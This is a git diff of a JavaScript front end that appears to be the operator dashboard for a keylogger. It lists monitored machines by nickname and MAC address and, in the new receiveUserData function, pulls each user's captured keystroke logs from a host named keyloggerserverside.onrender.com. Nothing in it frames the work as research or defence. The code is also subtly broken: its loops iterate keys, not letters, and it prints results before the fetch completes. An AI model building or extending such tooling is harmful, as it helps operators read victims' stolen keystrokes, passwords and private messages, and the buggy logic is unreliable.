@@ -8,18 +8,23 @@ function loadButtons() {
             console.log(data)
                 const container = document.getElementById('buttons_container')
                 data.forEach(file => {
-                    const a = document.createElement('a');
-                    a.href = 'otherPage.HTML'
                     const button = document.createElement('button');
-                    const p = document.createElement('p')
+                    const p1 = document.createElement('p')
+                    p1.classList.add('p_button')
+                    const p2 = document.createElement('p')
+                    p2.classList.add('p_button')
                     const br = document.createElement('br')
-                    p.textContent = `name: ${file.nickname}` + br.innerText + `mac adress: ${file.mac_address}`
-                    button.textContent = p.innerText
+                    p1.textContent = `name: ${file.nickname}`
+                    p2.textContent = `mac adress: ${file.mac_address}`
                     button.classList.add('button', 'button_hover', 'a_buttons')
-                    button.id = 'users_button'
-                    a.appendChild(button)
-
-                    container.appendChild(a)
+                    button.id = file._id
+                    button.appendChild(p1)
+                    button.appendChild(br)
+                    button.appendChild(p2)
+                    button.onclick = function() {
+                        clicking(button.id)
+                    }
+                    container.appendChild(button)
                     
 
                 })
@@ -28,11 +33,28 @@ function loadButtons() {
         )
 }
 
+function clicking(user_id) {
+    const id = user_id
+    window.location.href = `Dashboard.HTML?id=${user_id}`
+}
 
-// function receiveUserData(user_id) {
-//     fetch(`http://127.0.0.1:5000/user_data/${user_id}`, {method: 'GET'})
-//         .then(response => response.json())
-//         .then(data => {
-//             console.log('Hi')
-//         })
-// }
+function receiveUserData() {
+    const params = new URLSearchParams(window.location.search);
+    const id = params.get('id');
+    const lst = []
+    fetch(`https://keyloggerserverside.onrender.com/data/get_logs_for_user?id=${id}`, {method: 'GET'})
+        .then(response => response.json())
+        .then(data => data.logs)
+        .then(data => {
+            console.log(data)
+            for(win in data) {
+                for(time in win) {
+                    for(letter in time) {
+                        lst.push(letter)
+                    }
+                }
+            }
+        })
+    console.log(lst)
+        
+}
